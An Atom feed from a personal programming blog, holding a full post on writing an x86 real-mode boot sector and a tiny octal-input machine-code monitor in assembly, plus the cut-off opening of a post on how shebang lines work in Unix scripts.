<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://kblagoev.com/blog</id>
    <title>Kiril P. Blagoev Blog</title>
    <updated>2025-02-21T00:00:00.000Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://kblagoev.com/blog"/>
    <subtitle>Kiril P. Blagoev Blog</subtitle>
    <icon>https://kblagoev.com/img/logo.png</icon>
    <entry>
        <title type="html"><![CDATA[The Monitor - Bootstrapping a PC from BIOS]]></title>
        <id>https://kblagoev.com/blog/bootstrapping-a-pc-from-bios-the-monitor</id>
        <link href="https://kblagoev.com/blog/bootstrapping-a-pc-from-bios-the-monitor"/>
        <updated>2025-02-21T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[You're trapped in a basement. You have a computer, but it doesn't have an operating system. You have a floppy disk with a boot sector. What's on that floppy disk, so it can help you get out of this predicament? Let's McGyver ourselves out of this situation!]]></summary>
        <content type="html"><![CDATA[<h2 class="anchor anchorWithStickyNavbar_LWe7" id="a-long-preamble">A long preamble<a href="https://kblagoev.com/blog/bootstrapping-a-pc-from-bios-the-monitor#a-long-preamble" class="hash-link" aria-label="Direct link to A long preamble" title="Direct link to A long preamble">​</a></h2>
<p>As a programmer, it's often shocking to me the rift that exists between writing software, and knowing how a computer works. Web developers probably have it the toughest. You can write your React TODO app, and in no time have it effortlessly do dynamic checkboxing galore at the low low cost of thousands of megabytes of memory. And you never have to think about the stupid amount of abstractions that happen under the hood to make this work. The transpiling of Typescript to JavaScript. The JavaScript interpreter building bytecode on the fly. The network protocols defining forms and shapes of data, so that it can be sent, received and parsed by independent participants. The services that the host operating system runs to facilitate all those middle steps. The weaving and bobbing of data between your user space "server" and the OS kernel. The processor threads spawning in and out of existence at the speed of light. It's just insane how much happens under the hood. And all written by humans, by the way.</p>
<p>I have slowly begun to accept that I will never know all of these inner workings and how they function. But my everlasting internal strive for freedom shouts and begs. It wants me to know more, so I can do more. In my vain attempt at achieving ever broader knowledge, I recognise the opportunity to learn to do better at things I am but adequate at. Or, at least such are the delusions of a man, who just wants, nay - needs to always know more.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="the-gedankenexperiment">The Gedankenexperiment<a href="https://kblagoev.com/blog/bootstrapping-a-pc-from-bios-the-monitor#the-gedankenexperiment" class="hash-link" aria-label="Direct link to The Gedankenexperiment" title="Direct link to The Gedankenexperiment">​</a></h3>
<p>In that vein, I propose a thought experiment. Imagine that, due to circumstances out of the scope of this experiment, you find yourself locked in a basement. You have no wants for food or drink, but you need to communicate with the outside world. You have a PC in the basement. And it has a network cable plugged into it. You try turning the PC on, but all you see is the standard IBM PC BIOS start, and that classic POST check happen, with the ubiquitous high-pitched electronic <em>bing</em> to notify you that all is indeed good. But all is not good. The machine has no operating system, so you can't even check your Twitter, to make yourself feel good for being locked in a basement. All of that <em>raw</em> computing power right there in front of you, and you can't do <em>anything</em> with it!</p>
<figure><img src="https://kblagoev.com/content/images/2025/02/no-bootable-device.jpg"><figcaption>An example image to make your heart drop a beat.</figcaption></figure>
<p>You look around, and you find also a classic 3.5 inch floppy disk sitting on the desk (no, it's not a 3D-printed save icon), waiting patiently to be inserted into the floppy drive of the (apparently ancient) PC. You recognise the disk. You know it's just short of being empty, apart from something small on the boot sector of it.</p>
<p>A plan is now condensing onto the dimpled glossy surface of your brain like morning dew on motherboards laying in an electronics garbage dump. You need to write an operating system, some network drivers, a client for one of the hundreds of network protocols, and send a message out!</p>
<p>The question posed for the thought experiment is: what is on the floppy disk's boot sector, such that it would allow you to bootstrap the process?</p>
<div class="theme-admonition theme-admonition-note admonition_xJq3 alert alert--secondary"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M6.3 5.69a.942.942 0 0 1-.28-.7c0-.28.09-.52.28-.7.19-.18.42-.28.7-.28.28 0 .52.09.7.28.18.19.28.42.28.7 0 .28-.09.52-.28.7a1 1 0 0 1-.7.3c-.28 0-.52-.11-.7-.3zM8 7.99c-.02-.25-.11-.48-.31-.69-.2-.19-.42-.3-.69-.31H6c-.27.02-.48.13-.69.31-.2.2-.3.44-.31.69h1v3c.02.27.11.5.31.69.2.2.42.31.69.31h1c.27 0 .48-.11.69-.31.2-.19.3-.42.31-.69H8V7.98v.01zM7 2.3c-3.14 0-5.7 2.54-5.7 5.68 0 3.14 2.56 5.7 5.7 5.7s5.7-2.55 5.7-5.7c0-3.15-2.56-5.69-5.7-5.69v.01zM7 .98c3.86 0 7 3.14 7 7s-3.14 7-7 7-7-3.12-7-7 3.14-7 7-7z"></path></svg></span>note</div><div class="admonitionContent_BuS1"><p>At the end of this preamble, I want to point out that I'm no OS developer, and this is not a series of articles to teach you how to structure and create the next Linux kernel. This is just me playing around, breaking a lot of things, and learning along the way. Take the information here with a grain of salt, and mainly for entertainment purposes. What I'm doing here may seem obvious to you, or just plain boring - or it may be as weirdly magical and thought-provoking as it is for me. In either case, you might find something you enjoy. But you've been forewarned - an OS development course this ain't.</p></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="the-bootloader">The bootloader<a href="https://kblagoev.com/blog/bootstrapping-a-pc-from-bios-the-monitor#the-bootloader" class="hash-link" aria-label="Direct link to The bootloader" title="Direct link to The bootloader">​</a></h2>
<p>Modern IBM compatible PCs differ from hunks of expensively produced rocks of precious materials in one big way - they tend to have a Basic Input Output System (BIOS) installed on a ROM somewhere on their motherboards. This little program has two main jobs - running a diagnostic Power-On Self-Test (POST), and then giving the control to a user-provided program, which can further utilise the BIOS interrupts if it so desires.</p>
<p>As it can be seen on the screenshot above, the BIOS will look for bootable devices amongst different media such as CD-Roms, hard-drives and floppy drives. What it's looking for in particular is a so-called bootloader program, located on the medium's boot sector. What's a boot sector? Just a piece of memory, which is exactly 512 bytes long, and ends on the magic number <code>0xAA55</code>. The BIOS will just take these 512 bytes of memory, plop them on memory address <code>0x7C00</code>, and execute them. From there on, it takes no responsibility for what happens, apart from providing some basic input/output capabilities in the form of so-called <em>BIOS interrupts</em>.</p>
<p>So, our first goal is now becoming clearer. We need to write a program which is up to 512 bytes large, pad the remaining memory with zeroes, and end it with the magic number. Inside of this program, we can make use of BIOS interrupts.</p>
<p>The last thing we need to take into account is how we address memory. This is a huge topic with regards to how it's done in any operating system/hardware combo. For the purposes of this initial step, we can skip the explanations, and just state as a fact, that we will address memory using the so-called "16-bit real mode". So, we can just address <em>anything</em> we want from address <code>0x0000</code> to <code>0xFFFF</code>. And I mean it when I say anything. We can just read and overwrite anything in that range, potentially just breaking stuff along the way.</p>
<p>Well, we've pretty much established the first set of constraints of what needs to happen for our thought experiment. On the floppy disk our past selves have thoughtfully provided for us to use, we need to have a program, which:</p>
<ul>
<li>Is no larger than 512 bytes.</li>
<li>Needs to know it will be put on memory address <code>0x7C00</code>.</li>
<li>Has to end on the magic number <code>0xAA55</code>.</li>
<li>Can address memory using 16-bit numbers.</li>
<li>Can use <a href="https://grandidierite.github.io/bios-interrupts/" target="_blank" rel="noopener noreferrer">BIOS interrupts</a> to communicate with hardware.</li>
</ul>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="wilson">Wilson<a href="https://kblagoev.com/blog/bootstrapping-a-pc-from-bios-the-monitor#wilson" class="hash-link" aria-label="Direct link to Wilson" title="Direct link to Wilson">​</a></h3>
<p>So, let's turn our silicon-rock-of-a-computer into a virtual Wilson. I'm providing the assembly snippet that can make that happen, with comments. I hope those comments make sense, since I will attempt to not explain the code in text too much.</p>
<div class="language-asm codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-asm codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">[BITS 16]        ; Use 16-bit mode (x86 real mode)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[ORG 0x7C00]     ; Origin - BIOS loads boot sector at memory address 0x7C00</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">start:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    ; Print 'H'</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    mov ah, 0x0E   ; BIOS teletype output function (INT 10h, AH=0Eh)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    mov al, 'H'    ; Character to print</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    int 0x10       ; Call BIOS interrupt to display the character</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    ; Print 'i'</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    mov ah, 0x0E   ; BIOS teletype output function</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    mov al, 'i'    ; Character to print</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    int 0x10       ; Call BIOS interrupt to display the character</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    ; Infinite loop to prevent the bootloader from proceeding</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">hang:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    jmp hang</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">; Boot sector signature (must be 0xAA55 for BIOS to recognize it as bootable)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">times 510-($-$$) db 0   ; Fill the rest of the boot sector with zeroes</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">dw 0xAA55               ; Boot sector magic number</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>I suspect that the only thing which is harder to grasp is the interrupts themselves. They are just another set of magic numbers that point to routines loaded into memory by BIOS itself. There exists a <a href="https://www.ctyme.com/rbrown.htm" target="_blank" rel="noopener noreferrer">comprehensive list</a> of BIOS interrupts out there, for those curious about them.</p>
<p>As to how I compile this, put it on a floppy and run it in an emulator: you can check my repository on the matter, called <a href="https://github.com/tihawk/zilch" target="_blank" rel="noopener noreferrer">zilch</a>. Now, let's see how Wilson is doing.</p>
<figure><img src="https://kblagoev.com/content/images/2025/02/hi-wilson.jpg"><figcaption>Hi, Wilson.</figcaption></figure>
<p>Excellent! The beginnings of a long-lasting friendship, I'd imagine.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="the-monitor">The monitor<a href="https://kblagoev.com/blog/bootstrapping-a-pc-from-bios-the-monitor#the-monitor" class="hash-link" aria-label="Direct link to The monitor" title="Direct link to The monitor">​</a></h2>
<p>Now, Wilson is cool and all, but we have to push forward in order to achieve the true objective of our thought experiment. We need to have a program, which would bootstrap our OS-development efforts. If our past selves left a floppy disk with a program that just prints <strong>Hi</strong> on the screen, I don't think we'd get too far. Or be pleased with ourselves.</p>
<p>What we need is a program, which can receive input from the keyboard, and at some point execute whatever we input. This is called a <strong>monitor</strong>. Let's start real-simple-like, and define our monitor as such:</p>
<ol>
<li>The <strong>monitor</strong> can read keyboard strokes.</li>
<li>The input will be called the <strong>program</strong>.</li>
<li>The user can input the program using octal code (numbers in base 8 (digits from 0 to 7)).</li>
<li>The monitor will translate this input into hex (numbers in base 16), so that it can be understood as memory addresses, opcodes, and BIOS interrupts.</li>
<li>The user won't see what they're typing.</li>
<li>The user won't be able to edit what they type. If they make a mistake, they need to restart the computer and start from scratch.</li>
<li>The program will be stored on the boot sector, in the empty space between the end of the monitor, and the magic number <code>0xAA55</code>.</li>
<li>If the user types anything different from a digit from 0 to 7, the monitor will execute the program that has been input so far.</li>
</ol>
<p>Point 7 limits the size of our program to <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mn>512</mn><mo>−</mo><mtext>&lt;size&nbsp;of&nbsp;bootloader&gt;</mtext><mo stretchy="false">)</mo><mtext>&nbsp;bytes</mtext></mrow><annotation encoding="application/x-tex">(512 - \text{&lt;size of bootloader&gt;})\text{ bytes}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em"></span><span class="mopen">(</span><span class="mord">512</span><span class="mspace" style="margin-right:0.2222em"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em"></span><span class="mord text"><span class="mord">&lt;size&nbsp;of&nbsp;bootloader&gt;</span></span><span class="mclose">)</span><span class="mord text"><span class="mord">&nbsp;bytes</span></span></span></span></span>. It can be very easily avoided, but let's just keep it for now, as a minimalism thing.</p>
<p>Well, in all honesty, I just described exactly the operation of our little monitor, so let's just see it written in assembly.</p>
<div class="language-asm codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-asm codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">[BITS 16]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[ORG 0x7C00] ; BIOS loads the boot sector here</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">; Main loop</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">main:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    mov si, program ; Initialize pointer to the program array</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">input_loop:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    mov cx, 3 ; Read 3 digits</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">digit_input:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    ; Read a character from the keyboard</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    call getch</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    sub al, '0' ; Convert ASCII to numerical value</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    cmp al, 7</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    ja execute_program ; If input is greater than '7', jump to execute the program</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    ; Multiply the current byte by 8 and add the new digit</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    mov bl, byte [si]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    shl bl, 3</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    add bl, al</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    mov byte [si], bl</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    loop digit_input</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    ; Move to the next byte in the program array</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    inc si</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    jmp input_loop</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">; Execute the program stored in memory</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">execute_program:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    call program</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    ; Infinite loop (halt the CPU)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    jmp $</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">; Function to read a character from the keyboard using BIOS interrupt 0x16</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">getch:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    mov ah, 0x00</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    int 0x16</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    ret</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">; Reserve the remaining space on the boot sector for the program we input</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">program: times 510-($-$$) db 0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">; Boot sector magic number</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">dw 0xAA55</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>Again, the only special thing in the code itself is that we use BIOS interrupt <code>0x16</code> to read keyboard input. The monitor reads the input, waits for three consecutive digits from 0 to 7 to be input, translates them into hex and stores them in memory. If it detects anything different from these 8 digits, it just jumps to the program we've input so far, and executes it.</p>
<p>Why 3-digit numbers? Well, with 3 digits in octal we can represent 2 digits in hex (<code>0o377 = 0xFF</code>), which are 8 bits in binary (<code>0xFF = 0b11111111</code>). And so, once we have 3 digits in octal, that means we have a 1 byte number (as long as the octal number is <code>&lt;= 0o377</code>), which we can go ahead and store into memory as the next byte. Let's look at an example. If we input the number <code>020</code> into the monitor, this will be translated to the hex byte <code>0x10</code>. Do you know what that byte means? We've seen it before - it's the BIOS interrupt for printing onto the screen!</p>
<p>So, not only can we put random numbers into our monitor, that may or may not mean anything, we can input opcodes, BIOS interrupts and variables into it, constructing machine code that the computer can just run. We've gone to the lowest of low levels! We aren't even writing assembly anymore, we are literally speaking CPU-ese now.</p>
<p>Now, I've gone through the trouble of translating our Wilson program into octal machine code for us to use. It's just short enough, so we can test our monitor with it:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token number" style="color:#36acaa">264</span><span class="token plain"> 016 </span><span class="token number" style="color:#36acaa">260</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">110</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">315</span><span class="token plain"> 020 </span><span class="token number" style="color:#36acaa">264</span><span class="token plain"> 016 </span><span class="token number" style="color:#36acaa">260</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">151</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">315</span><span class="token plain"> 020 </span><span class="token number" style="color:#36acaa">364</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>All we have to do now is put our monitor on a floppy, start our PC with it inserted, wait for the BIOS to load the monitor (and display nothing), <em>blindly</em> input the machine code from above (without spaces!), hit a key which is larger than 7, and see if we can revive Wilson!</p>
<figure><img src="https://kblagoev.com/content/images/2025/02/hi-wilson-again.png"><figcaption>Hi, Wilson...again</figcaption></figure>
<p>I mean, at this point you really have to trust me that I did this...or go and do it yourself, using the code in <a href="https://github.com/tihawk/zilch" target="_blank" rel="noopener noreferrer">the repo</a>.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="so-far---so-good">So far - so good<a href="https://kblagoev.com/blog/bootstrapping-a-pc-from-bios-the-monitor#so-far---so-good" class="hash-link" aria-label="Direct link to So far - so good" title="Direct link to So far - so good">​</a></h2>
<p>In an extremely minimalistic way, we've technically achieved the requirements of the thought experiment. We have now a <strong>monitor</strong> program, which boots from the boot sector of a floppy disk, and in which we can input machine code to be executed directly from memory.</p>
<p>The next step would be to write a better monitor program, which has more text-editing capabilities. Then, maybe write a small assembler, so that we can write assembly instead of machine code, and assemble and run it. At that point, we will probably want to also escape real-mode, and go into 32-bit protected mode. Then we can even start writing and compiling C! And then we're really off to the races.</p>
<p>But let's just take a minute to appreciate what we've achieved. We do technically have the first step towards bootstrapping an entire computer from BIOS! If we are patient and damn-stubborn enough, we can build an OS from this by never leaving Wilson's keyboard again!</p>
<p>I will do all of these steps, and more, but for the time being I will leave this as is, so it doesn't become too cumbersome to read. I'm going to continue posting on the subject, so keep an eye out! Meanwhile, I hope you've enjoyed the ride so far, and are looking forward to more Bootstrapping from BIOS shenanigans! Have fun!</p>]]></content>
        <author>
            <name>Kiril Panayotov Blagoev</name>
            <uri>https://github.com/tihawk</uri>
        </author>
        <category label="OS-Development" term="OS-Development"/>
        <category label="BIOS-to-OS" term="BIOS-to-OS"/>
        <category label="Low-Level" term="Low-Level"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[On shebangs, and their funky behaviour]]></title>
        <id>https://kblagoev.com/blog/on-shebangs-being-funky</id>
        <link href="https://kblagoev.com/blog/on-shebangs-being-funky"/>
        <updated>2025-02-20T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[Shebangs, or interpreter directives have been around since the '80s. They help select interpreters for the little scripts we write. But I realised I've never really looked into why am I writing this magic line of nonsense in the beginning of scripts. And of course, what are its limitations and/or weird associated behaviours we can make use of?]]></summary>
        <content type="html"><![CDATA[<h2 class="anchor anchorWithStickyNavbar_LWe7" id="shebang-or-the-interpreter-directive">Shebang, or the interpreter directive<a href="https://kblagoev.com/blog/on-shebangs-being-funky#shebang-or-the-interpreter-directive" class="hash-link" aria-label="Direct link to Shebang, or the interpreter directive" title="Direct link to Shebang, or the interpreter directive">​</a></h2>
<p>Have you ever wondered what's that magical first line that you put on top of your scripts, and starts with the characters <code>#!</code> ?</p>
<p>You might've seen it, for example, in the form of <code>#!/usr/bin/env bash</code> on the first line of every bash script you've ever written or seen.</p>
<p>But why is it there, and what does it do?</p>
<p>This so-called <em>shebang</em> line is a Unix feature which was introduced <a href="https://homepages.cwi.nl/~aeb/std/shebang/origin.html" target="_blank" rel="noopener noreferrer">back in 1980</a> to allow for scripts to be run as executables by specifying the interpreter that the script needs to run itself. This simply means that with the shebang you're abstracting away the call to the interpreter, and instead of calling <code>bash script.sh</code> you can now just say <code>./script.sh</code>. That's mostly all there is to it. And yes, it's technically called an <em>interpreter directive</em>.</p>
<p>What happens in the background, is that the program loader finds the interpreter you've specified in your <code>PATH</code> variable, runs it, and passes the location of your script to the interpreter as an argument. You can see that much in your process viewer as well.</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">$ </span><span class="token function" style="color:#d73a49">cat</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> shebang.sh</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">#! /usr/bin/env bash</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token builtin class-name">echo</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"SHEBANG!"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token builtin class-name">read</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">^C</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$ </span><span class="token function" style="color:#d73a49">chmod</span><span class="token plain"> +x shebang.sh</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$ ./shebang.sh </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">ps</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-aux</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">grep</span><span class="token plain"> shebang</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">2</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">276038</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">SHEBANG</span><span class="token operator" style="color:#393A34">!</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">kblagoev  </span><span class="token number" style="color:#36acaa">276038</span><span class="token plain">  </span><span class="token number" style="color:#36acaa">0.0</span><span class="token plain">  </span><span class="token number" style="color:#36acaa">0.0</span><span class="token plain">  </span><span class="token number" style="color:#36acaa">13156</span><span class="token plain">  </span><span class="token number" style="color:#36acaa">3584</span><span class="token plain"> pts/5    T    </span><span class="token number" style="color:#36acaa">13</span><span class="token plain">:55   </span><span class="token number" style="color:#36acaa">0</span><span class="token plain">:00 </span><span class="token function" style="color:#d73a49">bash</span><span class="token plain"> ./shebang.sh</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">2</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain">+  Stopped                 ./shebang.sh</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$ </span><span class="token function" style="color:#d73a49">fg</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">./shebang.sh</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">^C</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">$</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="interpreters-you-say">Interpreters, you say<a href="https://kblagoev.com/blog/on-shebangs-being-funky#interpreters-you-say" class="hash-link" aria-label="Direct link to Interpreters, you say" title="Direct link to Interpreters, you say">​</a></h2>
<p>If you've also written Python scripts, you surely have seen that you can pass a shebang to the python script as well. Since Python is an interpreted language, it actually works in precisely the same way w.r.t. the shebang line. You can simply write <code>#!/usr/bin/env python3</code> at the top of your script, make it executable, and suddenly the program loader knows to run the python interpreter and pass your script location as an argument.</p>
